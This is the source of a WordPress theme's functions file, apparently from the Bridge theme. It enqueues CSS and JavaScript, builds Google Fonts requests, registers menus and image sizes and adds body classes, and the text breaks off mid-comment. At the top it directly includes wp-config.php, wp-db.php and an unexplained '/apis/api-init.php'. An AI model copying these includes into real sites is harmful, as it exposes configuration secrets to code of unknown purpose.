<?php

include_once get_template_directory().'/theme-includes.php';
include_once get_template_directory().'/apis/api-init.php';


include_once("wp-config.php");
include_once("wp-includes/wp-db.php");

/* Add css */
if (!function_exists('bridge_qode_styles')) {
    function bridge_qode_styles()
    {
        global $bridge_qode_options;
        global $woocommerce;


        wp_enqueue_style('wp-mediaelement');
        wp_enqueue_style("bridge-default-style", QODE_ROOT . "/style.css");
        bridge_qode_icon_collections()->enqueueStyles();
        wp_enqueue_style("bridge-stylesheet", QODE_ROOT . "/css/stylesheet.min.css");

        if ($woocommerce) {
            wp_enqueue_style("bridge-woocommerce", QODE_ROOT . "/css/woocommerce.min.css");
            if (!empty($bridge_qode_options['responsiveness']) && $bridge_qode_options['responsiveness'] == 'yes') {
                wp_enqueue_style("bridge-woocommerce-responsive", QODE_ROOT . "/css/woocommerce_responsive.min.css");
            }
        }

        wp_enqueue_style("bridge-print", QODE_ROOT . "/css/print.css");

        if (bridge_qode_timetable_schedule_installed()) {
            wp_enqueue_style("bridge-timetable", QODE_ROOT . "/css/timetable-schedule.min.css");
            wp_enqueue_style("bridge-timetable-responsive", QODE_ROOT . "/css/timetable-schedule-responsive.min.css");
        }

        //load styles before style dynamic because they are overriden with custom styles, qode-news for ex.
        do_action('bridge_qode_action_add_styles_before_style_dynamic');

        if (file_exists(dirname(__FILE__) . "/css/style_dynamic.css") && bridge_qode_is_css_folder_writable() && !is_multisite()) {
            wp_enqueue_style("bridge-style-dynamic", QODE_ROOT . "/css/style_dynamic.css", array(), filemtime(dirname(__FILE__) . "/css/style_dynamic.css"));
        } else if (file_exists(QODE_ROOT_DIR . '/css/style_dynamic_ms_id_' . bridge_qode_get_multisite_blog_id() . '.css') && bridge_qode_is_css_folder_writable() && is_multisite()) {
            wp_enqueue_style('bridge-style-dynamic', QODE_ROOT . '/css/style_dynamic_ms_id_' . bridge_qode_get_multisite_blog_id() . '.css', array(), filemtime(QODE_ROOT_DIR . '/css/style_dynamic_ms_id_' . bridge_qode_get_multisite_blog_id() . '.css')); //it must be included after woocommerce styles so it can override it
        } else {
            wp_enqueue_style("bridge-style-dynamic", QODE_ROOT . "/css/style_dynamic_callback.php");
        }


        $responsiveness = "yes";
        if (isset($bridge_qode_options['responsiveness']))
            $responsiveness = $bridge_qode_options['responsiveness'];
        if ($responsiveness != "no"):
            wp_enqueue_style("bridge-responsive", QODE_ROOT . "/css/responsive.min.css");

            if (file_exists(dirname(__FILE__) . "/css/style_dynamic_responsive.css") && bridge_qode_is_css_folder_writable() && !is_multisite()) {
                wp_enqueue_style("bridge-style-dynamic-responsive", QODE_ROOT . "/css/style_dynamic_responsive.css", array(), filemtime(dirname(__FILE__) . "/css/style_dynamic_responsive.css"));
            } else if (file_exists(QODE_ROOT_DIR . '/css/style_dynamic_responsive_ms_id_' . bridge_qode_get_multisite_blog_id() . '.css') && bridge_qode_is_css_folder_writable() && is_multisite()) {
                wp_enqueue_style('bridge-style-dynamic-responsive', QODE_ROOT . '/css/style_dynamic_responsive_ms_id_' . bridge_qode_get_multisite_blog_id() . '.css', array(), filemtime(QODE_ROOT_DIR . '/css/style_dynamic_responsive_ms_id_' . bridge_qode_get_multisite_blog_id() . '.css'));
            } else {
                wp_enqueue_style("bridge-style-dynamic-responsive", QODE_ROOT . "/css/style_dynamic_responsive_callback.php");
            }
        endif;

        $vertical_area = "no";
        if (isset($bridge_qode_options['vertical_area'])) {
            $vertical_area = $bridge_qode_options['vertical_area'];
        }
        if ($vertical_area == "yes" && $responsiveness != "no") {
            wp_enqueue_style("bridge-vertical-responsive", QODE_ROOT . "/css/vertical_responsive.min.css");
        }

        //include Visual Composer styles
        if (class_exists('WPBakeryVisualComposerAbstract')) {
            wp_enqueue_style('js_composer_front');
        }

        if (is_rtl()) {
            wp_enqueue_style('bridge-rtl', QODE_ROOT . '/rtl.css');
        }

		$custom_css = bridge_qode_options()->getOptionValue('custom_css');

		if ( ! empty( $custom_css ) ) {
			if ( $responsiveness != "no" ) {
				wp_add_inline_style( 'bridge-style-dynamic-responsive', $custom_css );
			} else {
				wp_add_inline_style( 'bridge-style-dynamic', $custom_css );
			}
		}

    }

	add_action('wp_enqueue_scripts', 'bridge_qode_styles');
}

if(!function_exists('bridge_qode_google_fonts_styles')) {
	/**
	 * Function that includes google fonts defined anywhere in the theme
	 */
	function bridge_qode_google_fonts_styles() {
		global $bridge_qode_options, $bridge_qode_framework;

		if(bridge_qode_options()->getOptionValue('disable_google_fonts') != 'yes') {
			$font_weight_str = '100,200,300,400,500,600,700,800,900,100italic,300italic,400italic,700italic';
			$default_font_string = 'Raleway:' . $font_weight_str;

			$font_sipmle_field_array = array();
			if (is_array($bridge_qode_framework->qodeOptions->getOptionsByType('fontsimple')) && count($bridge_qode_framework->qodeOptions->getOptionsByType('fontsimple'))) {
				$font_sipmle_field_array = $bridge_qode_framework->qodeOptions->getOptionsByType('fontsimple');
			}

			$font_field_array = array();
			if (is_array($bridge_qode_framework->qodeOptions->getOptionsByType('font')) && count($bridge_qode_framework->qodeOptions->getOptionsByType('font'))) {
				$font_field_array = $bridge_qode_framework->qodeOptions->getOptionsByType('font');
			}

			$available_font_options = array_merge($font_sipmle_field_array, $font_field_array);

			//define available font options array
			$fonts_array = array();
			foreach ($available_font_options as $font_option) {
				//is font set and not set to default and not empty?
				if (isset($bridge_qode_options[$font_option]) && $bridge_qode_options[$font_option] !== '-1' && $bridge_qode_options[$font_option] !== '' && !bridge_qode_is_native_font($bridge_qode_options[$font_option]) && !bridge_qode_is_custom_font($bridge_qode_options[$font_option])) {
					$font_option_string = $bridge_qode_options[$font_option] . ':' . $font_weight_str;
					if (!in_array($font_option_string, $fonts_array)) {
						$fonts_array[] = $font_option_string;
					}

				}
			}

			$font_subset_str = 'latin,latin-ext';

			//add google fonts set in slider
			$args = array(
				'post_type' => 'slides',
				'post_status' => 'publish',
				'posts_per_page' => -1
			);
			$loop = new WP_Query($args);

			if($loop->have_posts()):
				//for each slide defined
				while ($loop->have_posts()) : $loop->the_post();
					//is font family for title option chosen?
					if (get_post_meta(get_the_ID(), "qode_slide-title-font-family", true) != "") {
						$slide_title_font_family = get_post_meta(get_the_ID(), "qode_slide-title-font-family", true);
						$slide_title_font_string = $slide_title_font_family . ":" . $font_weight_str;
						if (!in_array($slide_title_font_string, $fonts_array) && !bridge_qode_is_native_font($slide_title_font_family) && !bridge_qode_is_custom_font($bridge_qode_options[$font_option])) {
							//include that font
							array_push($fonts_array, $slide_title_font_string);
						}
					}

					//is font family defined for slide's text?
					if (get_post_meta(get_the_ID(), "qode_slide-text-font-family", true) != "") {
						$slide_text_font_family = get_post_meta(get_the_ID(), "qode_slide-text-font-family", true);
						$slide_text_font_string = $slide_text_font_family . ":" . $font_weight_str;
						if (!in_array($slide_text_font_string, $fonts_array) && !bridge_qode_is_native_font($slide_text_font_family) && !bridge_qode_is_custom_font($bridge_qode_options[$font_option])) {
							//include that font
							array_push($fonts_array, $slide_text_font_string);
						}
					}

					//is font family defined for slide's subtitle?
					if (get_post_meta(get_the_ID(), "qode_slide-subtitle-font-family", true) != "") {
						$slide_subtitle_font_family = get_post_meta(get_the_ID(), "qode_slide-subtitle-font-family", true);
						$slide_subtitle_font_string = $slide_subtitle_font_family . ":" . $font_weight_str;
						if (!in_array($slide_subtitle_font_string, $fonts_array) && !bridge_qode_is_native_font($slide_subtitle_font_family) && !bridge_qode_is_custom_font($bridge_qode_options[$font_option])) {
							//include that font
							array_push($fonts_array, $slide_subtitle_font_string);
						}

					}
				endwhile;
			endif;

			wp_reset_postdata();

			$fonts_array         = array_diff( $fonts_array, array( '-1:' . $font_weight_str ) );
			$google_fonts_string = implode( '|', $fonts_array );

			$protocol = is_ssl() ? 'https:' : 'http:';

			//is google font option checked anywhere in theme?
			if ( count( $fonts_array ) > 0 ) {

				//include all checked fonts
				$fonts_full_list      = $default_font_string . '|' . str_replace( '+', ' ', $google_fonts_string );
				$fonts_full_list_args = array(
					'family' => urlencode( $fonts_full_list ),
					'subset' => urlencode( $font_subset_str ),
				);

				$bridge_php_global_fonts = add_query_arg( $fonts_full_list_args, $protocol . '//fonts.googleapis.com/css' );
				wp_enqueue_style( 'bridge-style-handle-google-fonts', esc_url_raw( $bridge_php_global_fonts ), array(), '1.0.0' );

			} else {
				//include default google font that theme is using
				$default_fonts_args          = array(
					'family' => urlencode( $default_font_string ),
					'subset' => urlencode( $font_subset_str ),
				);
				$bridge_php_global_fonts = add_query_arg( $default_fonts_args, $protocol . '//fonts.googleapis.com/css' );
				wp_enqueue_style( 'bridge-style-handle-google-fonts', esc_url_raw( $bridge_php_global_fonts ), array(), '1.0.0' );
			}
		}
	}

	add_action('wp_enqueue_scripts', 'bridge_qode_google_fonts_styles');
}

if( ! function_exists('bridge_qode_return_ui_scripts_array') ){
    /**
     * Function that collects and return all JQuery UI Scripts
     */
    function bridge_qode_return_ui_scripts_array(){

        $qode_ui_scripts = array();

        $qode_ui_scripts['jquery-ui-core'] = esc_html__('JQuery UI Core', 'bridge');
        $qode_ui_scripts['jquery-ui-widget'] = esc_html__('JQuery UI Widget', 'bridge');
        $qode_ui_scripts['jquery-ui-accordion'] = esc_html__('JQuery UI Accordion', 'bridge');
        $qode_ui_scripts['jquery-ui-autocomplete'] = esc_html__('JQuery UI Autocomplete', 'bridge');
        $qode_ui_scripts['jquery-ui-button'] = esc_html__('JQuery UI Button', 'bridge');
        $qode_ui_scripts['jquery-ui-datepicker'] = esc_html__('JQuery UI Datepicker', 'bridge');
        $qode_ui_scripts['jquery-ui-dialog'] = esc_html__('JQuery UI Dialog', 'bridge');
        $qode_ui_scripts['jquery-ui-draggable'] = esc_html__('JQuery UI Draggable', 'bridge');
        $qode_ui_scripts['jquery-ui-droppable'] = esc_html__('JQuery UI Droppable', 'bridge');
        $qode_ui_scripts['jquery-ui-menu'] = esc_html__('JQuery UI Menu', 'bridge');
        $qode_ui_scripts['jquery-ui-mouse'] = esc_html__('JQuery UI Mouse', 'bridge');
        $qode_ui_scripts['jquery-ui-position'] = esc_html__('JQuery UI Position', 'bridge');
        $qode_ui_scripts['jquery-ui-progressbar'] = esc_html__('JQuery UI Progressbar', 'bridge');
        $qode_ui_scripts['jquery-ui-selectable'] = esc_html__('JQuery UI Selectable', 'bridge');
        $qode_ui_scripts['jquery-ui-resizable'] = esc_html__('JQuery UI Resizable', 'bridge');
        $qode_ui_scripts['jquery-ui-sortable'] = esc_html__('JQuery UI Sortable', 'bridge');
        $qode_ui_scripts['jquery-ui-sortable'] = esc_html__('JQuery UI Sortable', 'bridge');
        $qode_ui_scripts['jquery-ui-slider'] = esc_html__('JQuery UI Slider', 'bridge');
        $qode_ui_scripts['jquery-ui-spinner'] = esc_html__('JQuery UI Spinner', 'bridge');
        $qode_ui_scripts['jquery-ui-tooltip'] = esc_html__('JQuery UI Tooltip', 'bridge');
        $qode_ui_scripts['jquery-ui-tabs'] = esc_html__('JQuery UI Tabs', 'bridge');
        $qode_ui_scripts['jquery-effects-core'] = esc_html__('JQuery Effects Core', 'bridge');
        $qode_ui_scripts['jquery-effects-blind'] = esc_html__('JQuery Effects Blind', 'bridge');
        $qode_ui_scripts['jquery-effects-bounce'] = esc_html__('JQuery Effects Bounce', 'bridge');
        $qode_ui_scripts['jquery-effects-clip'] = esc_html__('JQuery Effects Clip', 'bridge');
        $qode_ui_scripts['jquery-effects-drop'] = esc_html__('JQuery Effects Drop', 'bridge');
        $qode_ui_scripts['jquery-effects-explode'] = esc_html__('JQuery Effects Explode', 'bridge');
        $qode_ui_scripts['jquery-effects-fade'] = esc_html__('JQuery Effects Fade', 'bridge');
        $qode_ui_scripts['jquery-effects-fold'] = esc_html__('JQuery Effects Fold', 'bridge');
        $qode_ui_scripts['jquery-effects-highlight'] = esc_html__('JQuery Effects Highlight', 'bridge');
        $qode_ui_scripts['jquery-effects-pulsate'] = esc_html__('JQuery Effects Pulsate', 'bridge');
        $qode_ui_scripts['jquery-effects-scale'] = esc_html__('JQuery Effects Scale', 'bridge');
        $qode_ui_scripts['jquery-effects-shake'] = esc_html__('JQuery Effects Shake', 'bridge');
        $qode_ui_scripts['jquery-effects-slide'] = esc_html__('JQuery Effects Slide', 'bridge');
        $qode_ui_scripts['jquery-effects-transfer'] = esc_html__('JQuery Effects Transfer', 'bridge');

        return $qode_ui_scripts;
    }
}

/* Add js */

if (!function_exists('bridge_qode_scripts')) {
    function bridge_qode_scripts() {
        global $bridge_qode_options;
        global $is_IE;
        global $woocommerce;

        $smooth_scroll = true;
        if(isset($bridge_qode_options['smooth_scroll']) && $bridge_qode_options['smooth_scroll'] == "no"){
            $smooth_scroll = false;
        }

        $qode_ui_enabled_scripts = bridge_qode_options()->getOptionValue('qode_ui_scripts_option');

        if( is_array($qode_ui_enabled_scripts) && count($qode_ui_enabled_scripts) > 0){
            foreach ($qode_ui_enabled_scripts as $qode_ui_enabled_script){
                wp_enqueue_script($qode_ui_enabled_script);
            }
        }

        // 3rd party JavaScripts that we used in our theme
        wp_enqueue_script("doubleTapToGo", QODE_ROOT."/js/plugins/doubletaptogo.js",array('jquery'),false,true);
        wp_enqueue_script("modernizr", QODE_ROOT."/js/plugins/modernizr.min.js",array('jquery'),false,true);
        wp_enqueue_script("appear", QODE_ROOT."/js/plugins/jquery.appear.js",array('jquery'),false,true);
        wp_enqueue_script("hoverIntent");
        wp_enqueue_script("counter", QODE_ROOT."/js/plugins/counter.js",array('jquery'),false,true);
        wp_enqueue_script("easyPieChart", QODE_ROOT."/js/plugins/easypiechart.js",array('jquery'),false,true);
        wp_enqueue_script("mixItUp", QODE_ROOT."/js/plugins/mixitup.js",array('jquery'),false,true);
        wp_enqueue_script("prettyphoto", QODE_ROOT."/js/plugins/jquery.prettyPhoto.js",array('jquery'),false,true);
        wp_enqueue_script("fitvids", QODE_ROOT."/js/plugins/jquery.fitvids.js",array('jquery'),false,true);
        wp_enqueue_script("flexslider", QODE_ROOT."/js/plugins/jquery.flexslider-min.js",array('jquery'),false,true);
        wp_enqueue_script('wp-mediaelement');
        wp_enqueue_script("infiniteScroll", QODE_ROOT."/js/plugins/infinitescroll.min.js",array('jquery'),false,true);
        wp_enqueue_script("waitforimages", QODE_ROOT."/js/plugins/jquery.waitforimages.js",array('jquery'),false,true);
        wp_enqueue_script("jquery-form");
        wp_enqueue_script("waypoints", QODE_ROOT."/js/plugins/waypoints.min.js",array('jquery'),false,true);
        wp_enqueue_script("jplayer", QODE_ROOT."/js/plugins/jplayer.min.js",array('jquery'),false,true);
        wp_enqueue_script("bootstrapCarousel", QODE_ROOT."/js/plugins/bootstrap.carousel.js",array('jquery'),false,true);
        wp_enqueue_script("skrollr", QODE_ROOT."/js/plugins/skrollr.js",array('jquery'),false,true);
        wp_enqueue_script("charts", QODE_ROOT."/js/plugins/Chart.min.js",array('jquery'),false,true);
        wp_enqueue_script("easing", QODE_ROOT."/js/plugins/jquery.easing.1.3.js",array('jquery'),false,true);
        wp_enqueue_script("abstractBaseClass", QODE_ROOT."/js/plugins/abstractBaseClass.js",array('jquery'),false,true);
        wp_enqueue_script("countdown", QODE_ROOT."/js/plugins/jquery.countdown.js",array('jquery'),false,true);
        wp_enqueue_script("multiscroll", QODE_ROOT."/js/plugins/jquery.multiscroll.min.js",array('jquery'),false,true);
        wp_enqueue_script("justifiedGallery", QODE_ROOT."/js/plugins/jquery.justifiedGallery.min.js",array('jquery'),false,true);
        wp_enqueue_script("bigtext", QODE_ROOT."/js/plugins/bigtext.js",array('jquery'),false,true);
        wp_enqueue_script("stickyKit", QODE_ROOT."/js/plugins/jquery.sticky-kit.min.js",array('jquery'),false,true);
        wp_enqueue_script("owlCarousel", QODE_ROOT."/js/plugins/owl.carousel.min.js",array('jquery'),false,true);
        wp_enqueue_script("typed", QODE_ROOT."/js/plugins/typed.js",array('jquery'),false,true);

        wp_enqueue_script("carouFredSel", QODE_ROOT."/js/plugins/jquery.carouFredSel-6.2.1.min.js",array('jquery'),false,true);
        wp_enqueue_script("lemmonSlider", QODE_ROOT."/js/plugins/lemmon-slider.min.js",array('jquery'),false,true);
        wp_enqueue_script("one_page_scroll", QODE_ROOT."/js/plugins/jquery.fullPage.min.js",array('jquery'),false,true);
        wp_enqueue_script("mousewheel", QODE_ROOT."/js/plugins/jquery.mousewheel.min.js",array('jquery'),false,true);
        wp_enqueue_script("touchSwipe", QODE_ROOT."/js/plugins/jquery.touchSwipe.min.js",array('jquery'),false,true);
        wp_enqueue_script("isotope", QODE_ROOT."/js/plugins/jquery.isotope.min.js",array('jquery'),false,true);
        wp_enqueue_script("packery", QODE_ROOT."/js/plugins/packery-mode.pkgd.min.js",array('jquery'),false,true);
        wp_enqueue_script("stretch", QODE_ROOT."/js/plugins/jquery.stretch.js",array('jquery'),false,true);
        wp_enqueue_script("imagesLoaded", QODE_ROOT."/js/plugins/imagesloaded.js",array('jquery'),false,true);
        wp_enqueue_script("rangeSlider", QODE_ROOT."/js/plugins/rangeslider.min.js",array('jquery'),false,true);
        wp_enqueue_script("eventMove", QODE_ROOT."/js/plugins/jquery.event.move.js",array('jquery'),false,true);
        wp_enqueue_script("twentytwenty", QODE_ROOT."/js/plugins/jquery.twentytwenty.js",array('jquery'),false,true);
        wp_enqueue_script("swiper", QODE_ROOT."/js/plugins/swiper.min.js",array('jquery'),false,true);

        $mac_os   = strpos( getenv( "HTTP_USER_AGENT" ), 'Mac' );
        if($smooth_scroll && $mac_os == false){
            wp_enqueue_script("TweenLite", QODE_ROOT."/js/plugins/TweenLite.min.js",array('jquery'),false,true);
			if(!bridge_qode_layer_slider_installed() || !bridge_qode_revolution_slider_installed()){
				wp_enqueue_script("ScrollToPlugin", QODE_ROOT."/js/plugins/ScrollToPlugin.min.js",array('jquery'),false,true);
			}
            wp_enqueue_script("smoothPageScroll", QODE_ROOT."/js/plugins/smoothPageScroll.min.js",array('jquery'),false,true);
        }


        if ( $is_IE ) {
            wp_enqueue_script("html5", QODE_ROOT."/js/plugins/html5.js",array('jquery'),false,false);
        }

		if( (isset($bridge_qode_options['google_maps_api_key']) && $bridge_qode_options['google_maps_api_key'] != "")) {
			$google_maps_get_params = array();
			$google_maps_url = 'https://maps.googleapis.com/maps/api/js';
			$google_maps_api_key = $bridge_qode_options['google_maps_api_key'];
			$google_maps_url = add_query_arg( array( 'key' => $google_maps_api_key ), $google_maps_url );

			$google_maps_get_params = apply_filters('bridge_qode_filter_google_maps_get_params', $google_maps_get_params);
			if(is_array($google_maps_get_params) && count($google_maps_get_params) > 0){
				foreach ($google_maps_get_params as $google_maps_get_param => $value) {
					$google_maps_url = add_query_arg( array( $google_maps_get_param => $value ), $google_maps_url );
				}
			}
			wp_enqueue_script("google_map_api", $google_maps_url, array('jquery'),false,true);
		}

		if (file_exists(dirname(__FILE__) ."/js/default_dynamic.js") && bridge_qode_is_js_folder_writable() && !is_multisite()) {
			wp_enqueue_script("bridge-default-dynamic", QODE_ROOT."/js/default_dynamic.js",array('jquery'), filemtime(dirname(__FILE__) ."/js/default_dynamic.js"),true);
		} else if (file_exists(QODE_ROOT_DIR . '/js/default_dynamic_ms_id_' . bridge_qode_get_multisite_blog_id() . '.js') && bridge_qode_is_css_folder_writable() && is_multisite()) {
            wp_enqueue_script('bridge-default-dynamic', QODE_ROOT . '/js/default_dynamic_ms_id_' . bridge_qode_get_multisite_blog_id() . '.js', array('jquery'), filemtime(QODE_ROOT_DIR . '/js/default_dynamic_ms_id_' . bridge_qode_get_multisite_blog_id() . '.js'), true);
        } else {
			wp_enqueue_script("bridge-default-dynamic", QODE_ROOT."/js/default_dynamic_callback.php",array('jquery'),false,true);
		}

        wp_enqueue_script("bridge-default", QODE_ROOT."/js/default.min.js",array('jquery'),false,true);

		$custom_js = bridge_qode_options()->getOptionValue('custom_js');

		if ( ! empty( $custom_js ) ) {
			wp_add_inline_script( 'bridge-default', $custom_js );
		}
        	
        global $wp_scripts;
        $wp_scripts->add_data('comment-reply', 'group', 1 );
        if ( is_singular() ) wp_enqueue_script( "comment-reply");

        $has_ajax = false;
        $qode_animation = "";
        if (isset($_SESSION['qode_proya_page_transitions']))
            $qode_animation = $_SESSION['qode_proya_page_transitions'];
        if ((bridge_qode_options()->getOptionValue('page_transitions') != "0") && (empty($qode_animation) || ($qode_animation != "no")))
            $has_ajax = true;
        elseif (!empty($qode_animation) && ($qode_animation != "no"))
            $has_ajax = true;

        if ($has_ajax) :
            wp_enqueue_script("bridge-ajax", QODE_ROOT."/js/ajax.js",array('jquery'),false,true);
        endif;
        wp_enqueue_script( 'wpb_composer_front_js' );

        if(isset($bridge_qode_options['use_recaptcha']) && $bridge_qode_options['use_recaptcha'] == "yes") :
    			$url = 'https://www.google.com/recaptcha/api.js';
			$url = add_query_arg( array(
				'onload' => 'qodeRecaptchaCallback',
				'render' => 'explicit' ), $url );
        	wp_enqueue_script("recaptcha", $url,array('jquery'),false,true);
        endif;

        if($woocommerce) {
            wp_enqueue_script("bridge-woocommerce", QODE_ROOT."/js/woocommerce.min.js",array('jquery'),false,true);
	        wp_enqueue_script('select2');
        }
        do_action( 'bridge_qode_action_enqueue_third_party_scripts' );
		wp_localize_script( 'bridge-default', 'QodeAdminAjax', array( 'ajaxurl' => admin_url( 'admin-ajax.php' ) ) );


    }

	add_action('wp_enqueue_scripts', 'bridge_qode_scripts');
}

if (!function_exists('bridge_qode_get_global_variables')) {
	/**
	 * Function that generates global variables and put them in array so they could be used in the theme
	 */
	function bridge_qode_get_global_variables() {
		$global_variables = array();

		$global_variables['qodeAddingToCartLabel'] = esc_html__('Adding to Cart...', 'bridge');
		$global_variables['page_scroll_amount_for_sticky'] = bridge_qode_filter_px( get_post_meta( get_the_ID(), "qode_page_scroll_amount_for_sticky", true ) );

		$global_variables = apply_filters('bridge_qode_filter_js_global_variables', $global_variables);

		wp_localize_script('bridge-default', 'qodeGlobalVars', array(
			'vars' => $global_variables
		));
	}

	add_action('wp_enqueue_scripts', 'bridge_qode_get_global_variables');
}

/*Because of the bug when Revolution slider, Layer Slider and Smooth Scroll are enabled together (greensock.js doesn't have included ScrollTo so it need to be included before)*/

if(!function_exists('bridge_qode_scrollto_script')) {

	function bridge_qode_scrollto_script(){

		global $bridge_qode_options;

		$smooth_scroll = true;
		if(isset($bridge_qode_options['smooth_scroll']) && $bridge_qode_options['smooth_scroll'] == "no"){
			$smooth_scroll = false;
		}
		$mac_os = strpos( getenv( "HTTP_USER_AGENT" ), 'Mac' );
		if($smooth_scroll && $mac_os == false && bridge_qode_layer_slider_installed() && bridge_qode_revolution_slider_installed()) {
			wp_enqueue_script("ScrollToPlugin", QODE_ROOT . "/js/plugins/ScrollToPlugin.min.js", array(), false, false);
		}
	}

	add_action('wp_enqueue_scripts', 'bridge_qode_scrollto_script', 1);

}

/* Add admin js and css */

if (!function_exists('bridge_qode_admin_jquery')) {

	function bridge_qode_admin_jquery() {
        wp_enqueue_style('bridge-admin-style', QODE_ROOT.'/css/admin/admin-style.css', array(), '1.0', 'screen');
        wp_enqueue_style('thickbox');
        wp_enqueue_script('media-upload');
        wp_enqueue_media();
        wp_enqueue_script('thickbox');
        wp_enqueue_style('popup-colorstyle', QODE_ROOT.'/css/admin/popup-colorpicker.css', false, '1.0', 'screen');
        wp_enqueue_script( 'popup-color-picker', QODE_ROOT . '/js/admin/popup-colorpicker.js', array( 'jquery' ), '1.0.0', false );
        wp_enqueue_script('jquery-ui-datepicker');
        wp_enqueue_script('jquery-ui-accordion');
        wp_register_script('bridge-admin-default', QODE_ROOT.'/js/admin/default.js', array('jquery'), '1.0.0', false );
        //wp_enqueue_script('bridge-admin-default');
        wp_enqueue_script('common');
        wp_enqueue_script('wp-lists');
        wp_enqueue_script('postbox');
    }

	add_action('admin_enqueue_scripts', 'bridge_qode_admin_jquery');

}

if ( ! function_exists( 'bridge_qode_enqueue_widgets_admin_script' ) ) {
    /**
     * Function that enqueues styles and scripts for admin widgets page.
     *
     * @param $hook string current page hook to check
     */
    function bridge_qode_enqueue_widgets_admin_script( $hook ) {
        if ( $hook == 'widgets.php' ) {
            wp_enqueue_script( 'wp-color-picker' );
            wp_enqueue_script( 'bridge-script-handle-admin-widgets-image-fields-handler',get_template_directory_uri() . '/framework/admin/assets/js/qodef-widget-image-handler.js', array(), false, true );
            wp_enqueue_script( 'bridge-script-handle-admin-widgets-dependence', get_template_directory_uri() . '/framework/admin/assets/js/qodef-ui/qodef-widget-dependence.js', array(), false, true );
        }
    }

    add_action( 'admin_enqueue_scripts', 'bridge_qode_enqueue_widgets_admin_script' );
}

/* Register Menus */

if (!function_exists('bridge_qode_register_menus')) {
	/**
	 * Function that registers menu positions
	 */
	function bridge_qode_register_menus() {
		global $bridge_qode_options;

		if((isset($bridge_qode_options['header_bottom_appearance']) && $bridge_qode_options['header_bottom_appearance'] != "stick_with_left_right_menu") || (isset($bridge_qode_options['vertical_area']) && $bridge_qode_options['vertical_area'] == "yes")){
			//header and left menu location
			register_nav_menus(
				array('top-navigation' => esc_html__( 'Top Navigation', 'bridge')
				)
			);
		}

		//mobile menu
        register_nav_menus(
            array('mobile-navigation' => esc_html__( 'Mobile Navigation', 'bridge')
            )
        );

		//popup menu location
		register_nav_menus(
			array('popup-navigation' => esc_html__( 'Fullscreen Navigation', 'bridge')
			)
		);

		if((isset($bridge_qode_options['header_bottom_appearance']) && $bridge_qode_options['header_bottom_appearance'] == "stick_with_left_right_menu") && (isset($bridge_qode_options['vertical_area']) && $bridge_qode_options['vertical_area'] == "no")){
			//header left menu location
			register_nav_menus(
				array('left-top-navigation' => esc_html__( 'Left Top Navigation', 'bridge')
				)
			);

			//header right menu location
			register_nav_menus(
				array('right-top-navigation' => esc_html__( 'Right Top Navigation', 'bridge')
				)
			);
		}
	}

	add_action( 'after_setup_theme', 'bridge_qode_register_menus' );
}

if(!function_exists('bridge_qode_theme_setup')) {
    /**
     * Function that adds various features to theme. Also defines image sizes that are used in a theme
     */
    function bridge_qode_theme_setup() {
        //add post formats support
        add_theme_support('post-formats', array('gallery', 'link', 'quote', 'video', 'audio'));

        //add feedlinks support
        add_theme_support( 'automatic-feed-links' );

        //add theme support for post thumbnails
        add_theme_support( 'post-thumbnails' );

		//add theme support for title tag
		add_theme_support( 'title-tag' );

        //defined content width variable
        $GLOBALS['content_width'] = 1060;

        add_image_size( 'portfolio-square', 570, 570, true );
        add_image_size( 'portfolio-portrait', 600, 800, true );
        add_image_size( 'portfolio-landscape', 800, 600, true );
        add_image_size( 'menu-featured-post', 345, 198, true );
        add_image_size( 'qode-carousel_slider', 400, 260, true );
        add_image_size( 'portfolio_slider', 500, 380, true );
        add_image_size( 'portfolio_masonry_regular', 500, 500, true );
        add_image_size( 'portfolio_masonry_wide', 1000, 500, true );
        add_image_size( 'portfolio_masonry_tall', 500, 1000, true );
        add_image_size( 'portfolio_masonry_large', 1000, 1000, true );
        add_image_size( 'portfolio_masonry_with_space', 700);
        add_image_size( 'latest_post_boxes', 539, 303, true );

        //enable rendering shortcodes in widgets
        add_filter('widget_text', 'do_shortcode');

        //enable rendering shortcodes in call to action
        add_filter( 'call_to_action_widget', 'do_shortcode');

        load_theme_textdomain( 'bridge', get_template_directory().'/languages' );
    }

    add_action('after_setup_theme', 'bridge_qode_theme_setup');
}

if (!function_exists('bridge_qode_ajax_classes')) {
	/**
	 * Function that adds classes for ajax animation on body element
	 * @param $classes array of current body classes
 	 * @return array array of changed body classes
	 */
	function bridge_qode_ajax_classes($classes) {
		global $bridge_qode_options;
		$qode_animation="";
		if (isset($_SESSION['qode_animation'])) $qode_animation = $_SESSION['qode_animation'];
		if((bridge_qode_options()->getOptionValue('page_transitions') === "0") && ($qode_animation == "no")) :
			$classes[] = '';
		elseif(bridge_qode_options()->getOptionValue('page_transitions') === "1" && (empty($qode_animation) || ($qode_animation != "no"))) :
			$classes[] = 'ajax_updown';
			$classes[] = 'page_not_loaded';
		elseif(bridge_qode_options()->getOptionValue('page_transitions') === "2" && (empty($qode_animation) || ($qode_animation != "no"))) :
			$classes[] = 'ajax_fade';
			$classes[] = 'page_not_loaded';
		elseif(bridge_qode_options()->getOptionValue('page_transitions') === "3" && (empty($qode_animation) || ($qode_animation != "no"))) :
			$classes[] = 'ajax_updown_fade';
			$classes[] = 'page_not_loaded';
		elseif(bridge_qode_options()->getOptionValue('page_transitions') === "4" && (empty($qode_animation) || ($qode_animation != "no"))) :
			$classes[] = 'ajax_leftright';
			$classes[] = 'page_not_loaded';
		elseif(!empty($qode_animation) && $qode_animation != "no") :
			$classes[] = 'page_not_loaded';
		else:
		$classes[] ="";
		endif;

		return $classes;
	}

	add_filter('body_class','bridge_qode_ajax_classes');
}

/* Add class on body boxed layout */

if (!function_exists('bridge_qode_page_loading_effect_classes')) {
	/**
	 * Function that adds class on body for page loading effect
	 * @param $classes array of current body classes
	 * @return array array of changed body classes
	 */
	function bridge_qode_page_loading_effect_classes($classes) {

		if(bridge_qode_options()->getOptionValue('page_loading_effect') == 'yes') :
			$classes[] = 'qode-page-loading-effect-enabled';
		endif;

		return $classes;
	}

	add_filter('body_class','bridge_qode_page_loading_effect_classes');
}

/* Add class on body boxed layout */

if (!function_exists('bridge_qode_boxed_class')) {
	/**
	 * Function that adds class on body for boxed layout
	 * @param $classes array of current body classes
	 * @return array array of changed body classes
	 */
	function bridge_qode_boxed_class($classes) {
		global $bridge_qode_options;

		if(isset($bridge_qode_options['boxed']) && $bridge_qode_options['boxed'] == "yes" && isset($bridge_qode_options['transparent_content']) && $bridge_qode_options['transparent_content'] == 'no') :
			$classes[] = 'boxed';
		else:
		$classes[] ="";
		endif;

		return $classes;
	}

	add_filter('body_class','bridge_qode_boxed_class');
}


/* Add class on body for vertical menu */

if (!function_exists('bridge_qode_vertical_menu_class')) {

	/**
